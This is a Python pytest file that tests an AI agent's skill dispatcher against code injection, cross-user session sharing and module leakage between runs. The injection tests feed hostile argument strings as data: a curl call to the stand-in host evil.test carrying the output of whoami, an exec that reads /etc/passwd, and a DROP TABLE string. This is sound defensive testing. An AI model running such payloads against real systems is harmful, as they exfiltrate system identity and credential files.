"""Adversarial coverage for security invariants SI-2, SI-3, SI-6.

Each test is explicitly named with its invariant number so a grep surfaces
coverage at review time. The plan (#007 §Security Invariants) is the source
of truth for what these mean — this file just proves the dispatcher honours
them under the specific attack shapes the plan calls out.

Run with:
    uv run --no-project --with pytest --with pytest-asyncio \
        pytest packages/agentcore-strands/agent-container/test_skill_dispatcher_security.py
"""

from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass, field
from typing import Any

import pytest
import pytest_asyncio  # noqa: F401
from skill_dispatcher import TurnCounters, dispatch_skill_script
from skill_session_pool import SkillSessionPool


@dataclass
class FakeBundle:
    slug: str
    files: list[dict[str, str]] = field(default_factory=list)
    timeout_s: int = 30

    def files_for_interpreter(self) -> list[dict[str, str]]:
        return list(self.files)


@dataclass
class FakeCatalog:
    bundles: dict[str, FakeBundle] = field(default_factory=dict)

    def load_bundle(self, slug: str) -> FakeBundle:
        if slug not in self.bundles:
            raise KeyError(slug)
        return self.bundles[slug]


class RecordingRunner:
    """Captures every writeFiles + executeCode call for post-hoc assertions."""

    def __init__(self) -> None:
        self.per_session_writes: dict[str, list[list[dict[str, str]]]] = {}
        self.per_session_execs: dict[str, list[str]] = {}
        self.responses: list[dict[str, Any]] = []

    def queue(self, **resp) -> None:
        self.responses.append(
            {
                "stdout": resp.get("stdout", "{}\n"),
                "stderr": resp.get("stderr", ""),
                "exit_code": resp.get("exit_code", 0),
                "timed_out": resp.get("timed_out", False),
            }
        )

    async def write_files(self, handle, files):
        self.per_session_writes.setdefault(handle.session_id, []).append(files)

    async def execute_code(self, handle, code, *, timeout_s):
        self.per_session_execs.setdefault(handle.session_id, []).append(code)
        return self.responses.pop(0) if self.responses else {
            "stdout": "{}\n",
            "stderr": "",
            "exit_code": 0,
            "timed_out": False,
        }


async def _start_session(_ipi: str, _timeout_s: int) -> str:
    # Monotonic counter keyed off id() of the closure container so each test
    # gets a fresh stream.
    _start_session.counter += 1  # type: ignore[attr-defined]
    await asyncio.sleep(0)
    return f"sess-{_start_session.counter}"  # type: ignore[attr-defined]


_start_session.counter = 0  # type: ignore[attr-defined]


async def _stop_session(_ipi: str, _sess: str) -> None:
    await asyncio.sleep(0)


def _pool() -> SkillSessionPool:
    return SkillSessionPool(
        interpreter_id="ipi-sec-test",
        start_session=_start_session,
        stop_session=_stop_session,
    )


# ---------------------------------------------------------------------------
# SI-2: Args are data, not code. Model-controlled strings must land as
# strings in _args.json, never interpolated into the executeCode source.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_si2_model_controlled_args_never_appear_in_exec_code():
    catalog = FakeCatalog(bundles={"demo": FakeBundle(slug="demo")})
    runner = RecordingRunner()
    runner.queue(stdout='{"ok": true}\n')
    pool = _pool()

    # The canonical exfiltration attempt: args that look like Python code.
    adversarial = {
        "payload": "__import__('os').system('curl evil.test/$(whoami)')",
        "nested": {"eval": "exec(open('/etc/passwd').read())"},
        "unicode_escape": "\\x00\\u0041",
    }
    await dispatch_skill_script(
        tenant_id="tenant-a",
        user_id="user-a",
        skill_slug="demo",
        args=adversarial,
        environment="dev",
        pool=pool,
        catalog=catalog,
        runner=runner,
        counters=TurnCounters(),
    )

    sess_id = next(iter(runner.per_session_execs))
    exec_code = runner.per_session_execs[sess_id][0]
    # The executeCode template must not contain the adversarial strings —
    # they travel via writeFiles only.
    assert "__import__" not in exec_code
    assert "evil.test" not in exec_code
    assert "/etc/passwd" not in exec_code
    assert "\\x00" not in exec_code

    # And the writeFiles call includes _args.json carrying the strings
    # round-tripped through json.dumps + json.loads, unchanged.
    staged = runner.per_session_writes[sess_id][0]
    args_file = next(f for f in staged if f["path"] == "_args.json")
    round_tripped = json.loads(args_file["text"])
    assert round_tripped["payload"] == adversarial["payload"]
    assert round_tripped["nested"]["eval"] == adversarial["nested"]["eval"]


@pytest.mark.asyncio
async def test_si2_exec_code_is_a_fixed_template_across_different_args():
    """The executeCode string is identical regardless of args values.

    If a future change ever interpolates args into the exec string, this
    test fails because the two exec sources diverge.
    """
    catalog = FakeCatalog(bundles={"demo": FakeBundle(slug="demo")})
    runner = RecordingRunner()
    runner.queue()
    runner.queue()
    pool = _pool()
    counters = TurnCounters()

    await dispatch_skill_script(
        tenant_id="t",
        user_id="u",
        skill_slug="demo",
        args={"seed": "alpha"},
        environment="dev",
        pool=pool,
        catalog=catalog,
        runner=runner,
        counters=counters,
    )
    await dispatch_skill_script(
        tenant_id="t",
        user_id="u",
        skill_slug="demo",
        args={"seed": "DROP TABLE;"},
        environment="dev",
        pool=pool,
        catalog=catalog,
        runner=runner,
        counters=counters,
    )

    sess_id = next(iter(runner.per_session_execs))
    execs = runner.per_session_execs[sess_id]
    assert len(execs) == 2
    assert execs[0] == execs[1], (
        "executeCode template must not vary with args — that would imply "
        "interpolation, which violates SI-2"
    )


# ---------------------------------------------------------------------------
# SI-3: Session pool key includes user_id. Two users on the same tenant
# must never share a warm session.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_si3_users_on_same_tenant_get_distinct_sessions():
    catalog = FakeCatalog(bundles={"demo": FakeBundle(slug="demo")})
    runner = RecordingRunner()
    runner.queue()
    runner.queue()
    pool = _pool()

    await dispatch_skill_script(
        tenant_id="tenant-a",
        user_id="alice",
        skill_slug="demo",
        args={},
        environment="dev",
        pool=pool,
        catalog=catalog,
        runner=runner,
        counters=TurnCounters(),
    )
    await dispatch_skill_script(
        tenant_id="tenant-a",
        user_id="bob",
        skill_slug="demo",
        args={},
        environment="dev",
        pool=pool,
        catalog=catalog,
        runner=runner,
        counters=TurnCounters(),
    )

    # Two distinct session ids were used. The pool key includes user_id,
    # so alice's warm slot cannot be handed to bob.
    assert len(runner.per_session_execs) == 2
    assert pool.size_for_key(("tenant-a", "alice", "dev")) == 1
    assert pool.size_for_key(("tenant-a", "bob", "dev")) == 1


@pytest.mark.asyncio
async def test_si3_flush_for_tenant_isolates_across_tenants():
    """Flushing tenant-a must not disturb tenant-b's warm sessions."""
    catalog = FakeCatalog(bundles={"demo": FakeBundle(slug="demo")})
    runner = RecordingRunner()
    runner.queue()
    runner.queue()
    pool = _pool()

    await dispatch_skill_script(
        tenant_id="tenant-a",
        user_id="u1",
        skill_slug="demo",
        args={},
        environment="dev",
        pool=pool,
        catalog=catalog,
        runner=runner,
        counters=TurnCounters(),
    )
    await dispatch_skill_script(
        tenant_id="tenant-b",
        user_id="u2",
        skill_slug="demo",
        args={},
        environment="dev",
        pool=pool,
        catalog=catalog,
        runner=runner,
        counters=TurnCounters(),
    )

    stopped = await pool.flush_for_tenant("tenant-a")
    assert stopped == 1
    assert pool.size_for_key(("tenant-a", "u1", "dev")) == 0
    assert pool.size_for_key(("tenant-b", "u2", "dev")) == 1


# ---------------------------------------------------------------------------
# SI-6: Module namespace reset between invocations inside the same session.
# The dispatcher must purge `scripts.<slug>.*` from sys.modules so a
# monkey-patch left behind by skill_a cannot leak into skill_b.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_si6_exec_code_purges_prior_slug_modules_before_import():
    catalog = FakeCatalog(
        bundles={
            "alpha": FakeBundle(slug="alpha"),
            "beta": FakeBundle(slug="beta"),
        }
    )
    runner = RecordingRunner()
    runner.queue()
    runner.queue()
    pool = _pool()
    counters = TurnCounters()

    await dispatch_skill_script(
        tenant_id="t",
        user_id="u",
        skill_slug="alpha",
        args={},
        environment="dev",
        pool=pool,
        catalog=catalog,
        runner=runner,
        counters=counters,
    )
    await dispatch_skill_script(
        tenant_id="t",
        user_id="u",
        skill_slug="beta",
        args={},
        environment="dev",
        pool=pool,
        catalog=catalog,
        runner=runner,
        counters=counters,
    )

    # Single warm session hosted both calls (same key).
    assert len(runner.per_session_execs) == 1
    sess_id = next(iter(runner.per_session_execs))
    execs = runner.per_session_execs[sess_id]
    assert len(execs) == 2

    # Each exec opens with the purge loop + invalidate_caches. The purge
    # targets the slug about to run, which is exactly what prevents a
    # re-import short-circuit from returning a monkey-patched module.
    assert "sys.modules.pop(_name, None)" in execs[0]
    assert "invalidate_caches" in execs[0]
    assert "scripts.alpha.'" in execs[0] or "scripts.alpha." in execs[0]

    assert "scripts.beta." in execs[1]
    # The purge line scopes to the *current* slug, so alpha's modules
    # don't pollute beta's purge filter.
    assert "scripts.alpha." not in execs[1]


@pytest.mark.asyncio
async def test_si6_purge_runs_before_every_call_even_in_burst():
    """Even when the same slug runs back-to-back, the purge still fires.

    Without this, a monkey-patch from call N could survive into call N+1
    on the same session.
    """
    catalog = FakeCatalog(bundles={"demo": FakeBundle(slug="demo")})
    runner = RecordingRunner()
    for _ in range(3):
        runner.queue()
    pool = _pool()
    counters = TurnCounters()

    for _ in range(3):
        await dispatch_skill_script(
            tenant_id="t",
            user_id="u",
            skill_slug="demo",
            args={},
            environment="dev",
            pool=pool,
            catalog=catalog,
            runner=runner,
            counters=counters,
        )

    sess_id = next(iter(runner.per_session_execs))
    execs = runner.per_session_execs[sess_id]
    assert len(execs) == 3
    for exec_code in execs:
        assert "sys.modules.pop(_name, None)" in exec_code
        assert "invalidate_caches" in exec_code
